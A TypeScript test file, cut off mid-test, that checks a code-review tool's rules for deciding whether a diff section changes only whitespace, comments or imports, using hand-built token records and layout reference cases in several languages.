// Why: the token rules tell a reader what Graph's leaves, import bindings and relation slices show
// about a section, and the readers lane decides from them what a reading may skip. A `holds` whose
// claim is false would let a section go unread for a wrong reason, so each test names the result or
// reason it pins, and the cases where the rule must not hold are as many as those where it does.
// Tokens records are built here from small texts, as Graph's would be (one row per leaf, lines
// counted from the bytes), so no test needs the engine; ancestor chains and opens are set by hand
// where a test is about them.
import { expect, test } from "bun:test";
import {
  graphLeafFlags,
  type GraphFileTokens,
  type GraphImportBinding,
  type GraphImportStatement,
} from "@neuve/graph-client";

import type { ManifestHunk } from "../src/manifest.ts";
import {
  COUNTERPART_RULE,
  STANDING_BLIND_SPOTS,
  type ImportTargetAnswer,
  type RelationSlice,
  type SliceSymbol,
} from "../src/relations-slices.ts";
import { computeSectionFacts } from "../src/section-facts.ts";
import {
  linguistMarkOf,
  sectionRulesOf,
  type FileSignals,
  type SectionRuleJudgement,
} from "../src/section-rules.ts";
import {
  FAMILY_MIN_TOKENS,
  INDENTATION_DISCLOSURE,
  LAYOUT_DISCLOSURE,
  PROSE_TOOLS_DISCLOSURE,
  sectionFamiliesOf,
  type SectionRelations,
  type TokensGap,
} from "../src/section-token-rules.ts";
import { noStructure, type BlobStructure } from "../src/sections.ts";
import { diff, oidOf } from "./section-fixtures.ts";

const encoder = new TextEncoder();

// --- Tokens records built from text ------------------------------------------------------------

const IDENTIFIER = 1;
const COMMENT = 2;
const ERROR = 4;
const NAMED = 8;
/** The engine's coming `directive` bit, as the test reader below knows it. */
const DIRECTIVE = 32;

const KEYWORDS = new Set([
  "import",
  "from",
  "return",
  "const",
  "function",
  "type",
  "as",
  "satisfies",
  "package",
]);

interface Piece {
  type: string;
  start: number;
  end: number;
  flags: number;
  chain: string;
  opens: number;
}

/** Leaves as a grammar would give them for these small texts (ASCII only: bytes are characters). */
const lex = (source: string): Array<Piece> =>
  [
    ...source.matchAll(
      /\/\/[^\n]*|#[^\n]*|\/\*[\s\S]*?\*\/|`[^`]*`|"[^"]*"|[A-Za-z_$][\w$]*|\d+|\S/g,
    ),
  ].map((match) => {
    const text = match[0];
    const start = match.index;
    const end = start + text.length;
    const base = { start, end, chain: "root", opens: 0 };
    if (text.startsWith("//") || text.startsWith("/*") || text.startsWith("#"))
      return { ...base, type: "comment", flags: COMMENT | NAMED };
    if (/^[`"]/.test(text)) return { ...base, type: "string", flags: NAMED };
    if (/^\d/.test(text)) return { ...base, type: "number", flags: NAMED };
    if (/^[A-Za-z_$]/.test(text) && !KEYWORDS.has(text))
      return { ...base, type: "identifier", flags: IDENTIFIER | NAMED };
    return { ...base, type: text, flags: 0 };
  });

/** An import statement with the byte range Graph is adding (the statement node's own). */
type Statement = GraphImportStatement & {
  readonly startByte: number;
  readonly endByte: number;
};

/** `import … from "x";` and `import "x";` statements, one per line, with their bytes, as Graph gives them. */
const importsIn = (source: string): Array<Statement> => {
  let offset = 0;
  return source.split("\n").flatMap((line, index): Array<Statement> => {
    const lineStart = offset;
    offset += line.length + 1;
    const bare = /import "([^"]+)";?/.exec(line);
    if (bare !== null)
      return [
        {
          startByte: lineStart + bare.index,
          endByte: lineStart + bare.index + bare[0].length,
          startLine: index + 1,
          endLine: index + 1,
          specifier: bare[1]!,
          bindings: [],
          sideEffectOnly: true,
          namesUnknown: false,
        },
      ];
    const full = /import (type )?(.*?) from "([^"]+)";?/.exec(line);
    if (full === null) return [];
    const typeAll = full[1] !== undefined;
    const clause = full[2]!.trim();
    const named = /\{([^}]*)\}/.exec(clause)?.[1] ?? "";
    const plain = clause
      .replace(/\{[^}]*\}/, "")
      .replace(/,/g, "")
      .trim();
    const bindings = [
      ...(plain === ""
        ? []
        : [
            {
              imported: "default",
              local: plain,
              typeOnly: typeAll,
              localInferred: false,
            },
          ]),
      ...named
        .split(",")
        .map((entry) => entry.trim())
        .filter(Boolean)
        .map((entry) => {
          const typeOnly = typeAll || entry.startsWith("type ");
          const [imported, local] = entry.replace(/^type /, "").split(" as ");
          return {
            imported: imported!,
            local: local ?? imported!,
            typeOnly,
            localInferred: false,
          };
        }),
    ];
    return [
      {
        startByte: lineStart + full.index,
        endByte: lineStart + full.index + full[0].length,
        startLine: index + 1,
        endLine: index + 1,
        specifier: full[3]!,
        bindings,
        sideEffectOnly: false,
        namesUnknown: false,
      },
    ];
  });
};

/** A tokens record of `source`; `tweak` changes leaves by index, `imports` replaces the statements. */
const tokensOf = (
  source: string,
  options: {
    readonly tweak?: (piece: Piece, index: number) => Partial<Piece>;
    readonly imports?: Array<GraphImportStatement> | "not-extracted";
    readonly hasErrors?: boolean;
  } = {},
): GraphFileTokens => {
  const bytes = encoder.encode(source);
  const lineOf = (offset: number) =>
    1 + bytes.subarray(0, offset).filter((byte) => byte === 10).length;
  const pieces = lex(source).map((piece, index) => ({
    ...piece,
    ...options.tweak?.(piece, index),
  }));
  const types = [...new Set(pieces.map((piece) => piece.type))];
  const chains = [...new Set(pieces.map((piece) => piece.chain))];
  const imports = options.imports ?? importsIn(source);
  return {
    status: "available",
    hasErrors: options.hasErrors ?? false,
    identifierNames: [
      ...new Set(
        pieces
          .filter((piece) => (piece.flags & IDENTIFIER) !== 0)
          .map((piece) => source.slice(piece.start, piece.end)),
      ),
    ].sort(),
    leafTypes: types,
    ancestors: chains,
    leaves: pieces.map((piece) => [
      types.indexOf(piece.type),
      piece.start,
      piece.end,
      lineOf(piece.start),
      piece.end > piece.start ? lineOf(piece.end - 1) : lineOf(piece.start),
      piece.flags,
      chains.indexOf(piece.chain),
      piece.opens,
    ]),
    unknownFlagBits: 0,
    // As the client gives a TypeScript record of the approved engine; `setup` overrides both.
    directivesFlagged: true,
    indentationSignificant: false,
    imports:
      imports === "not-extracted"
        ? { status: "not-extracted" }
        : { status: "extracted", statements: imports },
  };
};

/** Reads the test's directive bit the way the client will once it knows the flag. */
const leafFlags = (
  tokens: GraphFileTokens & { status: "available" },
  at: number,
) => ({
  ...graphLeafFlags(tokens, at),
  directive: (tokens.leaves[at]![5] & DIRECTIVE) !== 0,
});

/** A reader that knows no `directive` flag, as one written before the engine had it. */
const dropsDirective = (
  tokens: GraphFileTokens & { status: "available" },
  at: number,
) => {
  const { directive: _directive, ...rest } = graphLeafFlags(tokens, at);
  return rest;
};

/** Flags as a directive every comment a tool obeys in these tests. */
const directives =
  (source: string) =>
  (piece: Piece): Partial<Piece> =>
    piece.type === "comment" &&
    /@ts-|eslint-|type: ignore|^\/\/go:build/.test(
      source.slice(piece.start, piece.end),
    )
      ? { flags: piece.flags | DIRECTIVE }
      : {};

// --- Sections and rules --------------------------------------------------------------------------

interface Change {
  readonly path: string;
  readonly before: string;
  readonly after: string;
}

const signals = (path: string): FileSignals => ({
  attributes: {
    "linguist-generated": { state: "unspecified", value: null },
    "linguist-vendored": { state: "unspecified", value: null },
  },
  blob: null,
  read: false,
  mark: linguistMarkOf(path),
});

interface Options {
  /** A blob's tokens record, by its text; undefined: not read. Default: `tokensOf(text)`. */
  readonly tokens?: (text: string, path: string) => GraphFileTokens | undefined;
  readonly noTokens?: boolean;
  /** The records' `directivesFlagged`, per blob text; default true. */
  readonly directivesFlagged?: boolean | ((text: string) => boolean);
  readonly noContents?: boolean;
  readonly relations?: SectionRelations;
  /** Read flags with the client's own reader (`graphLeafFlags`). */
  readonly defaultReader?: boolean;
  /** Read flags with a reader that gives comments no `directive` at all. */
  readonly dropsDirective?: boolean;
  /** Why a blob's record was not read, by its text (as `blobTokens` says). */
  readonly notRead?: (text: string) => TokensGap | undefined;
  /**
   * The records' `indentationSignificant`: `false` (declared free-form) when not given; `"absent"`
   * leaves the field out, as a record built before the client had it.
   */
  readonly indentationSignificant?: boolean | null | "absent";
}

const setup = (changes: ReadonlyArray<Change>, options: Options = {}) => {
  const hunks: Array<ManifestHunk> = changes.flatMap((change) => [
    ...diff(change.path, change.before, change.after),
  ]);
  const structures = new Map<string, BlobStructure>();
  const records = new Map<string, GraphFileTokens>();
  const contents = new Map<string, Uint8Array>();
  for (const change of changes)
    for (const text of [change.before, change.after]) {
      if (text === "") continue;
      const blob = oidOf(text);
      structures.set(
        blob,
        noStructure(
          "outline-unavailable",
          "TypeScript",
          text.split("\n").length - 1,
        ),
      );
      const record = (options.tokens ?? ((source) => tokensOf(source)))(
        text,
        change.path,
      );
      const flagged =
        typeof options.directivesFlagged === "function"
          ? options.directivesFlagged(text)
          : (options.directivesFlagged ?? true);
      if (record !== undefined) {
        if (record.status !== "available") records.set(blob, record);
        else {
          const { indentationSignificant: _declared, ...rest } = record;
          records.set(blob, {
            ...rest,
            directivesFlagged: flagged,
            ...(options.indentationSignificant === "absent"
              ? {}
              : {
                  indentationSignificant:
                    options.indentationSignificant === undefined
                      ? false
                      : options.indentationSignificant,
                }),
          } as GraphFileTokens);
        }
      }
      contents.set(blob, encoder.encode(text));
    }
  const result = computeSectionFacts(hunks, structures);
  return {
    hunks,
    structures,
    result,
    files: new Map(
      changes.map((change) => [change.path, signals(change.path)]),
    ),
    tokens: options.noTokens
      ? undefined
      : {
          byBlob: records,
          ...(options.notRead === undefined
            ? {}
            : {
                notRead: new Map(
                  changes.flatMap((change) =>
                    [change.before, change.after].flatMap((text) => {
                      const gap =
                        text === "" ? undefined : options.notRead!(text);
                      return gap === undefined
                        ? []
                        : [[oidOf(text), gap] as const];
                    }),
                  ),
                ),
              }),
          ...(options.dropsDirective === true
            ? { leafFlags: dropsDirective }
            : options.defaultReader === true
              ? {}
              : { leafFlags }),
        },
    contents: options.noContents ? undefined : contents,
  };
};

const rulesOf = (changes: ReadonlyArray<Change>, options: Options = {}) => {
  const built = setup(changes, options);
  return sectionRulesOf({
    result: built.result,
    hunks: built.hunks,
    structures: built.structures,
    files: built.files,
    texts: new Map(),
    ...(built.tokens === undefined ? {} : { tokens: built.tokens }),
    ...(built.contents === undefined ? {} : { contents: built.contents }),
    ...(options.relations === undefined
      ? {}
      : { relations: options.relations }),
  });
};

const only = (
  judgements: ReadonlyArray<SectionRuleJudgement>,
  rule: SectionRuleJudgement["rule"],
) => judgements.filter((judgement) => judgement.rule === rule);
const outcomes = (
  judgements: ReadonlyArray<SectionRuleJudgement>,
  rule: SectionRuleJudgement["rule"],
) =>
  only(judgements, rule).map((judgement) => [
    judgement.result,
    judgement.reason,
  ]);

const one = (before: string, after: string, path = "src/a.ts") => [
  { path, before, after },
];

// --- whitespace-only ----------------------------------------------------------------------------

/** Flags comments as the engine does in these cases: by what they say, or by where they sit. */
const engineFlags =
  (source: string) =>
  (piece: Piece): Partial<Piece> => {
    if (piece.type !== "comment") return {};
    const text = source.slice(piece.start, piece.end);
    const directive =
      /@ts-|eslint-|type: ignore|^\/\/go:|^\/\/line |^#!|coding[:=]|#include|^\/\/\s*\w+$/.test(
        text,
      ) ||
      // A cgo preamble is flagged by position: only while it touches `import "C"`.
      source.startsWith('\nimport "C"', piece.end);
    return directive ? { flags: piece.flags | DIRECTIVE } : {};
  };

/**
 * The graph lane's layout reference (`logs/sections/census-1-reference/layout-cases.jsonl`, column
 * `changesWithGaps`), every case the test's record builder can express. `holds` names the rule that
 * must hold where the case is no change.
 */
const LAYOUT_CASES: ReadonlyArray<{
  readonly name: string;
  readonly path: string;
  readonly base: string;
  readonly head: string;
  readonly holds: "whitespace-only" | "comment-only" | null;
}> = [
  {
    name: "wrapped-argument-list",
    path: "a.ts",
    base: "const r = call(alpha, beta, gamma);\n",
    head: "const r = call(\n  alpha,\n  beta,\n  gamma\n);\n",
    holds: null,
  },
  {
    name: "wrapped-argument-list-trailing-comma",
    path: "a.ts",
    base: "const r = call(alpha, beta, gamma);\n",
    head: "const r = call(\n  alpha,\n  beta,\n  gamma,\n);\n",
    holds: null,
  },
  {
    name: "return-then-line-break",
    path: "a.ts",
    base: "function f(x: number) {\n  return x + 1;\n}\n",
    head: "function f(x: number) {\n  return\n  x + 1;\n}\n",
    holds: null,
  },
  {
    name: "reindented-template",
    path: "a.ts",
    base: "const s = `line one\n  line two`;\n",
    head: "const s = `line one\n      line two`;\n",
    holds: null,
  },
  {
    name: "reindented-block",
    path: "a.ts",
    base: "if (a) {\nb();\n}\n",
    head: "if (a) {\n    b();\n}\n",
    holds: "whitespace-only",
  },
  {
    name: "blank-lines-between-statements",
    path: "a.ts",
    base: "const a = 1;\nconst b = 2;\n",
    head: "const a = 1;\n\n\nconst b = 2;\n",
    holds: "whitespace-only",
  },
  {
    name: "comment-added",
    path: "a.ts",
    base: "function f() {\n  return 1;\n}\n",
    head: "function f() {\n  // Explain why the retry is bounded.\n  return 1;\n}\n",
    holds: "comment-only",
  },
  {
    name: "comment-marker-inside-string",
    path: "a.ts",
    base: 'const u = "http://a";\n',
    head: 'const u = "http://a // b";\n',
    holds: null,
  },
  {
    name: "postfix-increment-line-break",
    path: "a.ts",
    base: "let a = 1;\nlet b = 2;\na++\nb\n",
    head: "let a = 1;\nlet b = 2;\na\n++\nb\n",
    holds: null,
  },
  {
    name: "arrow-body-wrapped",
    path: "a.ts",
    base: "const f = (x: number) => x * 2;\n",
    head: "const f = (x: number) =>\n  x * 2;\n",
    holds: null,
  },
  {
    name: "jsx-text-reflowed",
    path: "a.tsx",
    base: "const e = <p>one two</p>;\n",
    head: "const e = <p>one\n  two</p>;\n",
    holds: null,
  },
  {
    name: "jsx-attributes-wrapped",
    path: "a.tsx",
    base: 'const e = <a href="x" title="y" />;\n',
    head: 'const e = <a\n    href="x"\n    title="y"\n  />;\n',
    holds: null,
  },
  {
    name: "quote-style",
    path: "a.ts",
    base: "const s = 'a';\n",
    head: 'const s = "a";\n',
    holds: null,
  },
  {
    name: "semicolon-added",
    path: "a.ts",
    base: "const a = 1\n",
    head: "const a = 1;\n",
    holds: null,
  },
  {
    name: "comment-bare-word-added",
    path: "a.ts",
    base: "function f() {\n  return 1;\n}\n",
    head: "function f() {\n  // explain\n  return 1;\n}\n",
    holds: null,
  },
  {
    name: "directive-comment-changed",
    path: "a.ts",
    base: "// @ts-expect-error old reason\nconst a: number = f();\n",
    head: "// @ts-expect-error new reason\nconst a: number = f();\n",
    holds: null,
  },
  {
    name: "trailing-whitespace-removed",
    path: "a.ts",
    base: "const a = 1;   \nconst b = 2;\n",
    head: "const a = 1;\nconst b = 2;\n",
    holds: "whitespace-only",
  },
  {
    name: "aligned-with-spaces",
    path: "a.ts",
    base: "const a = 1;\nconst bb = 2;\n",
    head: "const a  = 1;\nconst bb = 2;\n",
    holds: "whitespace-only",
  },
  {
    name: "tab-replaces-spaces",
    path: "a.ts",
    base: "if (a) {\n        b();\n}\n",
    head: "if (a) {\n\tb();\n}\n",
    holds: null,
  },
  {
    name: "blank-line-added-in-argument-list",
    path: "a.ts",
    base: "const r = call(\n  alpha,\n  beta\n);\n",
    head: "const r = call(\n  alpha,\n\n  beta\n);\n",
    holds: "whitespace-only",
  },
  {
    name: "line-comment-forces-a-break",
    path: "a.ts",
    base: "const s = a + b;\n",
    head: "const s = a + // why\n  b;\n",
    holds: null,
  },
  // The graph reviewer's counterexamples: equal leaves on both sides, a change all the same.
  {
    name: "go-generate-indented",
    path: "a.go",
    base: "package a\n\n//go:generate echo G\nfunc F() {}\n",
    head: "package a\n\n\t//go:generate echo G\nfunc F() {}\n",
    holds: null,
  },
  {
    name: "go-line-directive-indented",
    path: "a.go",
    base: "package a\n\n//line foo.go:10\nfunc F() {}\n",
    head: "package a\n\n  //line foo.go:10\nfunc F() {}\n",
    holds: null,
  },
  {
    name: "cgo-preamble-blank-line",
    path: "a.go",
    base: 'package a\n\n// #include <stdio.h>\nimport "C"\n',
    head: 'package a\n\n// #include <stdio.h>\n\nimport "C"\n',
    holds: null,
  },
  {
    name: "cgo-preamble-prose-blank-line",
    path: "a.go",
    base: 'package a\n\n// int add(int a, int b);\nimport "C"\n',
    head: 'package a\n\n// int add(int a, int b);\n\nimport "C"\n',
    holds: null,
  },
  {
    name: "python-coding-cookie-pushed",
    path: "a.py",
    base: "# -*- coding: latin-1 -*-\nx = 1\n",
    head: "\n\n# -*- coding: latin-1 -*-\nx = 1\n",
    holds: null,
  },
  {
    name: "python-tab-for-spaces",
    path: "a.py",
    base: "if a:\n        b()\n        c()\n",
    head: "if a:\n        b()\n\tc()\n",
    holds: null,
  },
  {
    name: "shebang-after-space",
    path: "a.py",
    base: "#!/usr/bin/env python3\nx = 1\n",
    head: " #!/usr/bin/env python3\nx = 1\n",
    holds: null,
  },
  {
    name: "ts-abstract-line-break",
    path: "a.ts",
    base: "abstract class A {}\n",
    head: "abstract\nclass A {}\n",
    holds: null,
  },
  {
    name: "ts-export-default-abstract-line-break",
    path: "a.ts",
    base: "export default abstract class A {}\n",
    head: "export default abstract\nclass A {}\n",
    holds: null,
  },
  {
    name: "ts-using-line-break",
    path: "a.ts",
    base: "{\n  using x = y;\n}\n",
    head: "{\n  using\n  x = y;\n}\n",
    holds: null,
  },
  {
    name: "ts-interface-line-break",
    path: "a.ts",
    base: "interface I {}\n",
    head: "interface\nI {}\n",
    holds: null,
  },
  {
    name: "js-async-arrow-line-break",
    path: "a.js",
    base: "const f = async (x) => x;\n",
    head: "const f = async\n(x) => x;\n",
    holds: null,
  },
];

for (const layoutCase of LAYOUT_CASES)
  test(`layout reference \`${layoutCase.name}\`: ${layoutCase.holds === null ? "a change, no layout judgement holds" : `${layoutCase.holds} holds`}`, () => {
    // Why: equal leaves are not equal behaviour; the gaps between tokens, and the bytes beside a
    // directive, decide. Each expectation is the reference's own.
    const rules = rulesOf(
      one(layoutCase.base, layoutCase.head, layoutCase.path),
      { tokens: (text) => tokensOf(text, { tweak: engineFlags(text) }) },
    );
    const layout = rules.filter(
      (judgement) =>
        judgement.rule === "whitespace-only" ||
        judgement.rule === "comment-only",
    );
    expect(
      layout.map((judgement) => [judgement.rule, judgement.result]),
    ).toEqual(layoutCase.holds === null ? [] : [[layoutCase.holds, "holds"]]);
  });

test("a directive flag that changed away from every run still refuses the file", () => {
  // Why: Graph can flag a comment by its position (a cgo preamble, a coding cookie), so a flag can
  // change where no run is; the file's directives must be the same in number and text.
  const before = "a;\n// x\nb;\nc;\n";
  const after = "a;\n// x\nb;\n\nc;\n";
  const flagAtBase = (text: string) =>
    tokensOf(text, {
      tweak: (piece) =>
        text === before && piece.type === "comment"
          ? { flags: piece.flags | DIRECTIVE }
          : {},
    });
  const layout = (rules: ReadonlyArray<SectionRuleJudgement>) => [
    ...outcomes(rules, "whitespace-only"),
    ...outcomes(rules, "comment-only"),
  ];
  expect(layout(rulesOf(one(before, after), { tokens: flagAtBase }))).toEqual(
    [],
  );
  // The control: the same rows with the flag unchanged hold.
  expect(layout(rulesOf(one(before, after)))).toEqual([["holds", null]]);
});

test("a directive is a comment a tool obeys: whitespace beside a comment is not decided where directives are not read", () => {
  // Why: without readable directives a comment is no compared leaf, so the whitespace beside it is
  // only kind-checked; each change below moves or indents a directive. Where directives are read,
  // each is refused.
  const cases: ReadonlyArray<readonly [string, string, string]> = [
    [
      "a.go",
      "package a\n\n//go:generate echo G\nfunc F() {}\n",
      "package a\n\n  //go:generate echo G\nfunc F() {}\n",
    ],
    [
      "a.ts",
      "a(); // eslint-disable-line\nb();\n",
      "a();\n// eslint-disable-line\nb();\n",
    ],
    [
      "a.py",
      "x = f()  # type: ignore\ny = g()\n",
      "x = f()\n# type: ignore\ny = g()\n",
    ],
  ];
  const layout = (rules: ReadonlyArray<SectionRuleJudgement>) => [
    ...outcomes(rules, "whitespace-only"),
    ...outcomes(rules, "comment-only"),
  ];
  for (const [path, before, after] of cases) {
    expect(
      outcomes(
        rulesOf(one(before, after, path), { directivesFlagged: false }),
        "whitespace-only",
      ),
    ).toEqual([["not-evaluated", "directives-not-flagged"]]);
    expect(
      layout(
        rulesOf(one(before, after, path), {
          tokens: (text) => tokensOf(text, { tweak: engineFlags(text) }),
        }),
      ),
    ).toEqual([]);
  }
  // No comment in reach of the change: whitespace-only still holds without readable directives.
  expect(
    outcomes(
      rulesOf(one("if (a) {\nb();\n}\n", "if (a) {\n    b();\n}\n"), {
        directivesFlagged: false,
      }),
      "whitespace-only",
    ),
  ).toEqual([["holds", null]]);
});

test("where indentation is syntax or not declared, a reindented block is not decided; a blank line between statements still holds; declared free-form, it holds and says so", () => {
  // Why: in Python a line's leading whitespace is part of the program, so equal tokens and gap
  // kinds do not settle a reindent. An engine that does not declare the key (`null`), or a record
  // without the field, says nothing, so the file is treated as indentation-significant. Only a
  // language declared free-form (`false`) lets the reindent hold, and it says the indentation
  // changed.
  const before = "if a:\n    b()\n";
  const after = "if a:\n        b()\n";
  for (const declared of [true, null, "absent"] as const)
    expect(
      outcomes(
        rulesOf(one(before, after, "a.py"), {
          indentationSignificant: declared,
        }),
        "whitespace-only",
      ),
    ).toEqual([]);
  expect(
    outcomes(
      rulesOf(one("a()\nb()\n", "a()\n\nb()\n", "a.py"), {
        indentationSignificant: true,
      }),
      "whitespace-only",
    ),
  ).toEqual([["holds", null]]);
  const [free] = only(
    rulesOf(one(before, after, "a.py"), { indentationSignificant: false }),
    "whitespace-only",
  );
  expect([free!.result, free!.inputs.indentationChanged]).toEqual([
    "holds",
    true,
  ]);
  expect(free!.statement).toContain("the indentation of a line changed");
});

test("whitespace-only carries its statement and disclosures", () => {
  const [judgement] = only(
    rulesOf(one("if (a) {\nb();\n}\n", "if (a) {\n    b();\n}\n")),
    "whitespace-only",
  );
  expect(judgement!.statement).toContain(
    "no token changed and every gap between tokens kept its kind",
  );
  expect(judgement!.inputs.disclosure).toEqual([
    LAYOUT_DISCLOSURE,
    INDENTATION_DISCLOSURE,
  ]);
  expect(judgement!.inputs.leaves).toEqual({ removed: 4, added: 4 });
});

test("a gap's whitespace holding any byte but a space or a line feed must be byte-identical", () => {
  // Why: a form feed, a tab or a carriage return can mean something the tree does not show; no
  // list of characters is kept, and such a byte is no wiring error.
  expect(
    outcomes(rulesOf(one("a;\nb;\n", "a;\n\fb;\n")), "whitespace-only"),
  ).toEqual([]);
  expect(
    outcomes(rulesOf(one("a;\nb;\n", "a;\r\nb;\n")), "whitespace-only"),
  ).toEqual([]);
});

test("a changed indentation is recorded: a reindented line holds with it, an alignment change without", () => {
  // Why: where indentation carries meaning a language can refuse a dedent the tree accepts; the
  // rule cannot see that, so it says whether a line's leading whitespace changed.
  const [reindented] = only(
    rulesOf(one("if (a) {\nb();\n}\n", "if (a) {\n    b();\n}\n")),
    "whitespace-only",
  );
  expect([reindented!.result, reindented!.inputs.indentationChanged]).toEqual([
    "holds",
    true,
  ]);
  const [aligned] = only(
    rulesOf(
      one("const a = 1;\nconst bb = 2;\n", "const a  = 1;\nconst bb = 2;\n"),
    ),
    "whitespace-only",
  );
  expect([aligned!.result, aligned!.inputs.indentationChanged]).toEqual([
    "holds",
    false,
  ]);
});

test("same leaves and gaps in another tree are a change", () => {
  // Why: only the ancestors of \`b\` differ (Graph's tree changed); the control without that
  // holds, so the tree is what refused it.
  const before = "foo(a,  b);\n";
  const after = "foo(a, b);\n";
  const moved = (source: string) => (piece: Piece) =>
    source === after && source.slice(piece.start, piece.end) === "b"
      ? { chain: "elsewhere" }
      : {};
  expect(
    outcomes(
      rulesOf(one(before, after), {
        tokens: (text) => tokensOf(text, { tweak: moved(text) }),
      }),
      "whitespace-only",
    ),
  ).toEqual([]);
  expect(outcomes(rulesOf(one(before, after)), "whitespace-only")).toEqual([
    ["holds", null],
  ]);
});

test("a reader that drops the directive bit is not taken as flagging directives; the client's reader reads it", () => {
  // Why: with both records saying directives are flagged, a reader without a boolean \`directive\`
  // would make every directive read as prose. The client's \`graphLeafFlags\` gives the bit where
  // the record says flagged, so a changed directive is a changed token there.
  expect(
    outcomes(
      rulesOf(one("// @ts-ignore\nfoo();\n", "// @ts-expect-error\nfoo();\n"), {
        defaultReader: true,
        tokens: (text) => tokensOf(text, { tweak: directives(text) }),
      }),
      "comment-only",
    ),
  ).toEqual([]);
  const rules = rulesOf(
    one("// @ts-ignore\nfoo();\n", "// @ts-expect-error\nfoo();\n"),
    {
      dropsDirective: true,
      tokens: (text) => tokensOf(text, { tweak: directives(text) }),
    },
  );
  expect(outcomes(rules, "comment-only")).toEqual([
    ["not-evaluated", "directives-not-flagged"],
  ]);
  expect(only(rules, "comment-only")[0]!.inputs).toMatchObject({
    directivesDeclared: { old: true, new: true },
    directivesFlagged: { old: false, new: false },
  });
  // The same in imports-only: a comment on a changed import row cannot be told from prose.
  expect(
    outcomes(
      rulesOf(
        one(
          'import { a } from "./a"; // eslint-disable-line no-unused-vars\n',
          'import { a } from "./a";\n',
        ),
        {
          relations: FILES,
          dropsDirective: true,
          tokens: (text) => tokensOf(text, { tweak: directives(text) }),
        },
      ),
      "imports-only",
    ),
  ).toEqual([["not-evaluated", "directives-not-flagged"]]);
});

test("an error leaf, or a tree with errors, is not evaluated", () => {
  const before = "foo(a,  b);\n";
  const after = "foo(a, b);\n";
  const errorLeaf = rulesOf(one(before, after), {
    tokens: (text) =>
      tokensOf(text, {
        tweak: (piece, index) =>
          index === 0 ? { flags: piece.flags | ERROR } : {},
      }),
  });
  expect(outcomes(errorLeaf, "whitespace-only")).toEqual([
    ["not-evaluated", "error-leaf"],
  ]);
  const errors = rulesOf(one(before, after), {
    tokens: (text) => tokensOf(text, { hasErrors: text === after }),
  });
  expect(outcomes(errors, "whitespace-only")).toEqual([
    ["not-evaluated", "parse-errors"],
  ]);
  expect(outcomes(errors, "comment-only")).toEqual([
    ["not-evaluated", "parse-errors"],
  ]);
});

test("tokens unavailable for a retryable reason are not evaluated, and say so", () => {
  const after = "foo(a,\n  b);\n";
  const rules = rulesOf(one("foo(a, b);\n", after), {
    tokens: (text) =>
      text === after
        ? {
            status: "unavailable",
            reason: "partial-failure",
            retryable: true,
            codes: ["E_TIMEOUT"],
          }
        : tokensOf(text),
  });
  const [judgement] = only(rules, "whitespace-only");
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-evaluated",
    "tokens-unavailable",
  ]);
  expect(judgement!.inputs.retryable).toBe(true);
  expect(judgement!.inputs.tokens).toMatchObject({
    new: { status: "unavailable", reason: "partial-failure", retryable: true },
  });
  expect(judgement!.statement).toContain("a later read may give them");
});

test("a side whose tokens were not read says why: a stable or retryable gap is not evaluated with its reason; a side that is no text gives nothing", () => {
  // Why: the wiring reads tokens itself and knows why a record is missing (the engine declares no
  // tokens, Graph was unavailable, the blob is over the size bound or a symlink); a reader must see
  // the reason, and whether a later read may change it, and a symlink is no text to judge.
  const before = 'import { a } from "./a";\nfoo(a, b);\n';
  const after =
    'import { a } from "./a";\nimport { b } from "./b";\nfoo(a,\n  b);\n';
  for (const gap of [
    { reason: "engine-unsupported", retryable: false },
    { reason: "graph-unavailable", retryable: true },
  ]) {
    const rules = rulesOf(one(before, after), {
      relations: FILES,
      tokens: (text) => (text === after ? undefined : tokensOf(text)),
      notRead: (text) => (text === after ? gap : undefined),
    });
    const layout = only(rules, "whitespace-only");
    expect(
      layout.map((judgement) => [judgement.result, judgement.reason]),
    ).toEqual(layout.map(() => ["not-evaluated", "tokens-not-read"]));
    expect(layout.length).toBeGreaterThan(0);
    expect(layout[0]!.inputs).toMatchObject({
      retryable: gap.retryable,
      tokens: { new: { status: "not-read", ...gap } },
    });
    expect(layout[0]!.statement).toContain(`(${gap.reason})`);
    expect(outcomes(rules, "imports-only")).toEqual(
      outcomes(rules, "imports-only").map(() => [
        "not-evaluated",
        "tokens-not-read",
      ]),
    );
    expect(outcomes(rules, "imports-only").length).toBeGreaterThan(0);
  }
  const symlink = rulesOf(one(before, after), {
    relations: FILES,
    tokens: (text) => (text === after ? undefined : tokensOf(text)),
    notRead: (text) =>
      text === after ? { reason: "symlink", retryable: false } : undefined,
  });
  expect([
    ...outcomes(symlink, "whitespace-only"),
    ...outcomes(symlink, "comment-only"),
    ...outcomes(symlink, "imports-only"),
  ]).toEqual([]);
});

test("a language Graph does not declare for tokens gets no layout judgement", () => {
  const rules = rulesOf(one("a = 1\n", "a  = 1\n", "conf/a.lua"), {
    tokens: () => ({
      status: "unavailable",
      reason: "unsupported-language",
      retryable: false,
      codes: [],
    }),
  });
  expect(outcomes(rules, "whitespace-only")).toEqual([]);
  expect(outcomes(rules, "comment-only")).toEqual([]);
});

test("contents not read are not evaluated", () => {
  const rules = rulesOf(one("foo(a, b);\n", "foo(a,\n  b);\n"), {
    noContents: true,
  });
  expect(outcomes(rules, "whitespace-only")).toEqual([
    ["not-evaluated", "contents-not-read"],
  ]);
});

// --- comment-only -------------------------------------------------------------------------------

test("a comment added inside a function holds as comment-only and is counted", () => {
  const rules = rulesOf(
    one(
      "function f() {\n  return 1;\n}\n",
      "function f() {\n  // one\n  return 1;\n}\n",
    ),
  );
  expect(outcomes(rules, "comment-only")).toEqual([["holds", null]]);
  expect(outcomes(rules, "whitespace-only")).toEqual([]);
  const [judgement] = only(rules, "comment-only");
  expect(judgement!.inputs.comments).toEqual({
    added: 1,
    removed: 0,
    changed: 0,
  });
  expect(judgement!.inputs.firstLineCommentChanged).toBe(false);
  expect(judgement!.inputs.disclosure).toEqual([
    LAYOUT_DISCLOSURE,
    PROSE_TOOLS_DISCLOSURE,
    INDENTATION_DISCLOSURE,
  ]);
  expect(judgement!.statement).toContain(
    "only comments changed, none flagged as a directive, and every gap between tokens kept its kind",
  );
});

test("a comment change together with a token change gives no judgement", () => {
  const rules = rulesOf(one("// a\nfoo(1);\n", "// b\nfoo(2);\n"));
  expect(outcomes(rules, "comment-only")).toEqual([]);
  expect(outcomes(rules, "whitespace-only")).toEqual([]);
});

test("a changed comment on the file's first line is flagged in the inputs", () => {
  const rules = rulesOf(one("// one\nfoo();\n", "// two\nfoo();\n"));
  const [judgement] = only(rules, "comment-only");
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.comments).toEqual({
